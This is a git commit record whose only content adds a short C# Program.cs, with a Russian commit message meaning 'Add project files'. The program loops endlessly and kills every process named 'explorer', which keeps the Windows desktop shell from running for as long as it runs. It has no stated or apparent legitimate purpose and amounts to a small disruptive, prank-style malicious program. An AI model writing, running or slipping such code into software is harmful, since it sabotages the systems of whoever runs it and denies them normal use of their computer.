a22b7dcdc0fa88a0248cbdfb441fc081fd9c7666
d-cuzya <Admin@DESKTOP-T6OG5FF>
2024-12-25 11:49:23 +0300

    Добавьте файлы проекта.

---
+++ Program.cs
@@ -0,0 +1,14 @@
+﻿using System;
+using System.Diagnostics;
+
+while (true)
+{
+    var listprocess = Process.GetProcesses();
+    for (int i = 0; i < listprocess.Length; i++)
+    {
+        if (listprocess[i].ProcessName == "explorer")
+        {
+            listprocess[i].Kill();  
+        }
+    }
+}
